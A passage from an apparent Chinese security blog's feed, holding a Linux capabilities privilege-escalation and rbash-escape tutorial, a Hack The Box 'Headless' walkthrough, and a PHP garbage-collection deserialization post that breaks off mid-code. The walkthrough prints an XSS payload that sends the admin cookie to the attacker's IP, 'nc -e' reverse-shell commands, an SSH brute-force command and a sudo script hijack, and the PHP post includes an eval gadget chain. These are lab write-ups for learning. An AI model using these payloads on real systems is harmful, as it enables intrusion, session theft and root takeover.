class="hljs-type">FL_LEASE标志</span><br></code></pre></td></tr></table></figure><p>capability和suid的区别在于: suid是针对某个用户给权限，而capability针对的是某个程序。在设置程序能力时，有三个选项可选:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">inheritable，简称<span class="hljs-selector-tag">i</span>，表示是否可继承。<br>permitted，简称<span class="hljs-selector-tag">p</span>，表示是否允许使用。<br>effective，简称e，表示特权是否有效。<br></code></pre></td></tr></table></figure><p>setcap命令用来设置能力，例如setcap cap_setuid+ep &#x2F;home&#x2F;demo&#x2F;python3，就表示</p><p>home&#x2F;demo&#x2F;python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用</p><p>setcap设置能力，getcap读取能力。</p><p>getcap通过r参数来读取指定目录下有能力的程序。</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/166.png"></p><p>能力滥用导致的提权</p><p>例如管理员要为python3程序设置超级权限给kali用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。</p><p>因为root只想给kali用户的python3能力，所以这里是将程序复制到了kali用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cp</span> /usr/bin/python3 .<br>                                                                                          <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo <span class="hljs-built_in">setcap</span> cap_setuid+ep ./python3<br>[sudo] kali 的密码：<br>                                                                                          <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">getcap</span> -r ./ 2&gt;/dev/null<br>./python3 cap_setuid=ep<br>./test.txt cap_setuid=ep<br>                                                                                          <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ./python3 -c <span class="hljs-string">&quot;import os; os.setuid(0); os.system(&#x27;/bin/bash&#x27;)&quot;</span><br>┌──(root㉿kali)-[~/桌面]<br>└─<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="10-rbash绕过"><a href="#10-rbash绕过" class="headerlink" title="10.rbash绕过"></a>10.rbash绕过</h3><p>bash是Restricted bash缩写，即受限制的bash。管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。在rbash中，很多行为和命令都会被受到限制。</p><p>这里测试test账户，使用root将test账户的bash改为rbash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/桌面]<br>└─<span class="hljs-comment"># usermod -s /bin/rbash test</span><br><br>┌──(root㉿kali)-[~/桌面]<br>└─<span class="hljs-comment"># cat /etc/passwd | grep ^test</span><br><span class="hljs-built_in">test</span>:x:1001:1001::/home/test:/bin/rbash<br></code></pre></td></tr></table></figure><p>然后切换为test账号，发现环境为rbash,shell环境是rbash。</p><h4 id="vi绕过"><a href="#vi绕过" class="headerlink" title="vi绕过"></a>vi绕过</h4><p>可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh，命令如下:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span><br>:<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br>:<span class="hljs-keyword">shell</span><br><span class="hljs-keyword">cd</span> /etc<br><span class="hljs-keyword">pwd</span><br></code></pre></td></tr></table></figure><h4 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h4><p>ed也是一个文件编辑的命令，和vi类似，也是内联编辑模式，可输入命令，相关命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ed<br>!<span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure><h4 id="sh、bash、dash绕过"><a href="#sh、bash、dash绕过" class="headerlink" title="sh、bash、dash绕过"></a>sh、bash、dash绕过</h4><p>默认情况下，可以在rbash中执行sh、bash、dash等命令，以此来绕过rbash。</p><h4 id="python、perl绕过"><a href="#python、perl绕过" class="headerlink" title="python、perl绕过"></a>python、perl绕过</h4><p>可以尝试运行python和per命令，如果允许执行，则可以用程序来调用bin&#x2F;bash绕过rbash，我这里测试python不行，per柯以，相关命令如下。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment">#python</span><br>python3 -c &#x27;import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#x27;<br><span class="hljs-comment">#perl</span><br>perl -e &#x27;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Headless(HTB)</title>
    <link href="/2024/05/27/Headless-HTB/"/>
    <url>/2024/05/27/Headless-HTB/</url>
    
    <content type="html"><![CDATA[<p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><p>首先我们先用nmap扫描目标开放的端口和服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kali)-[/home/kali/桌面]<br>└─# <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- --<span class="hljs-built_in">min</span>-rate <span class="hljs-number">1000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span>    <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span> <span class="hljs-number">01</span>:<span class="hljs-number">06</span> EDT<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span>)<br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.89</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">5000</span>/tcp <span class="hljs-keyword">open</span>  upnp<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">119.49</span> seconds<br>                                                                                                                                  <br>┌──(root㉿kali)-[/home/kali/桌面]<br>└─# <span class="hljs-keyword">nmap</span> -sT -sV -sC -O -p22,<span class="hljs-number">5000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span> <span class="hljs-number">01</span>:<span class="hljs-number">09</span> EDT<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span>)<br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.54</span>s latency).<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh     OpenSSH <span class="hljs-number">9.2</span>p1 Debian <span class="hljs-number">2</span>+deb12u2 (protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">256</span> <span class="hljs-number">90</span>:<span class="hljs-number">02</span>:<span class="hljs-number">94</span>:<span class="hljs-number">28</span>:<span class="hljs-number">3</span>d:<span class="hljs-keyword">a</span><span class="hljs-variable">b:22</span>:<span class="hljs-number">74</span>:df:<span class="hljs-number">0</span><span class="hljs-keyword">e</span>:a3:b2:<span class="hljs-number">0</span><span class="hljs-keyword">f</span>:<span class="hljs-number">2</span><span class="hljs-variable">b:c6</span>:<span class="hljs-number">17</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-keyword">e</span>:b9:<span class="hljs-number">08</span>:<span class="hljs-number">24</span>:<span class="hljs-number">02</span>:<span class="hljs-number">1</span><span class="hljs-variable">b:60</span>:<span class="hljs-number">94</span>:<span class="hljs-number">60</span>:b3:<span class="hljs-number">84</span>:a9:<span class="hljs-number">9</span><span class="hljs-keyword">e</span>:<span class="hljs-number">1</span><span class="hljs-variable">a:60</span>:<span class="hljs-keyword">ca</span> (ED25519)<br><span class="hljs-number">5000</span>/tcp <span class="hljs-keyword">open</span>  upnp?<br>| fingerprint-strings:<br></code></pre></td></tr></table></figure><p>我们可以看到开放了22号端口，和5000端口</p><p>可以考虑爆破和扫描目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l root -P <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/桌面/</span>passwd.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">11.8</span> ssh -V  <span class="hljs-comment">#爆破ssh登录密码</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">192.168.1.10</span><br></code></pre></td></tr></table></figure><p>没有爆破出来</p><p>我们扫描目录发现</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/135.png"></p><p>访问 <code>/support</code> 返回是一个表单在message中进行xss操作会返回 <code>Hacking Attempt Detected</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Hacking</span> Attempt Detected<br><br><span class="hljs-attribute">Your</span> IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.<br><br><span class="hljs-attribute">Client</span> Request Information:<br><br><span class="hljs-attribute">Method</span>: POST<br><span class="hljs-attribute">URL</span>: http://<span class="hljs-number">10.10.11.8:5000</span>/support<br><span class="hljs-attribute">Headers</span>: Host: <span class="hljs-number">10.10.11.8:5000</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">117</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">10.10.11.8:5000</span><br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.10.11.8:5000</span>/support<br><span class="hljs-attribute">Cookie</span>: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>由于我们知道我们的用户代理标头正在被记录，因此我们可以尝试在日志中存储 xxs 有效负载。有效负载存储在服务器上的日志中，然后在管理员查看日志时执行。窃取is_admin cookie。然后访问 <code>/dashboard</code>  </p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/154.png"></p><p>cookie窃取参考资料：  <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e">https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://10.10.16.26:5566/?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>本机</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.11.8</span> - - <span class="hljs-string">[27/May/2024 03:22:50]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 </span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/155.png"></p><p>我们拿到管理员的cookie后，可以访问 <code>/dashboard</code> 抓包发现有一个时间的参数  <code>；</code> <code> &amp;&amp;</code> 执行两条命令</p><p>我们采用   <code>nc -e /bin/bash 10.10.16.26 9001</code> 反弹shell</p><p>我们拿到的是用户dvir</p><p>提权</p><p>使用命令 sudo -l 列出当前用户被授权执行的命令清单的命令  (通常情况下，只有具有root权限的用户才能执行 <code>sudo -l</code> 命令,其他用户使用命令，需要系统管理员明确地在 sudoers 文件中配置相应的权限)</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/156.png"></p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/157.png"></p><p>弄清楚我们可以使用 root 权限运行什么。这是一个简单的脚本，它将调用用户可访问的二进制文件-&gt; &#x2F;initdb.sh</p><p>因为我们可以编辑该二进制文件，所以我们只需在那里插入另一个 shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span>  <span class="hljs-string">&quot;nc -e /bin/sh 10.10.16.26 9002&quot;</span> &gt; initdb.sh<br><span class="hljs-built_in">chmod</span> +x initdb.sh<br>sudo /usr/bin/syscheck<br></code></pre></td></tr></table></figure><p>我们可以在攻击者的机器上启动另一个监听器，在使用 sudo 执行 syscheck 函数后，我们就得到了反向 root shell。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP GC垃圾回收机制</title>
    <link href="/2024/02/12/PHP%20GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/02/12/PHP%20GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在php中，当对象被销毁时会自动调用__destruct()方法，如果程序报错或者抛出异常，则就不会触发该魔术方法。但是在PHP中存在垃圾回收机制可以提前触发__destruct()函数</p><h3 id="GC概念"><a href="#GC概念" class="headerlink" title="GC概念"></a>GC概念</h3><p>在PHP中，使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，当一个变量被设置为<code>NULL</code>，或者没有任何指针指向时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉，那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被<code>GC</code>机制回收，在回收的过程中，它会自动触发<code>_destruct</code>方法，而这也就是我们绕过抛出异常的关键点。</p><h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p>PHP 变量存储在称为“zval”的容器中。zval 容器除了变量的类型和值之外，还包含两个额外的信息。</p><p>第一个是“is_ref”，是布尔值，表示变量是否是“引用集合”的一部分。通过这个位，PHP 引擎知道如何区分普通变量和引用。由于 PHP 允许用户自定义引用，通过 &amp; 运算符创建引用，zval 容器还有内部引用计数机制来优化内存使用。</p><p>第二个是“refcount”，表示有多少个变量名（也称为符号）指向这个 zval 容器。所有符号都存储在一个符号表中，每个作用域都有一个符号表。主脚本（即通过浏览器请求的脚本）有一个作用域，每个函数或方法也有一个作用域。</p><p>示例1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=1, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>示例2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=2, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>示例3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;new string&quot;</span>; <br><span class="hljs-variable">$b</span> =&amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span> =&amp;<span class="hljs-variable">$b</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=1)=&#x27;new string<span class="hljs-string">&#x27;</span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>unset将引用销毁了</p><p>示例4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-variable">$num</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__destruct()&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>); <br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">2</span>); <br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>方法一：利用unset将$a销毁，使得refcount&#x3D;0，从而触动垃圾回收机制</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/image-20240206160553912.png"></p><p>方法二：当对象为NULL时也可以触发<code>__destruct</code>，我们可以利用数组，第一个索引为对象，第二个索引复制为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cg0</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;hello __destruct&quot;</span>; <br>        &#125; <br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cg1</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello __toString&quot;</span>; <br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;<span class="hljs-title function_ invoke__">flag</span>(); <br>        &#125; <br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cg2</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">flag</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello __flag()&quot;</span>; <br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd); <br>    &#125; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]); <br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Garbage collection&quot;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">cg0</span></span><br><span class="hljs-title class_"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>&#125;<br><br><span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">cg1</span></span><br><span class="hljs-title class_"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br><br>&#125;<br><br><span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">cg2</span></span><br><span class="hljs-title class_"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>&#125;<br><br><span class="hljs-variable">$c0</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">cg0</span>();<br><span class="hljs-variable">$c1</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">cg1</span>();<br><span class="hljs-variable">$c2</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">cg2</span>();<br><span 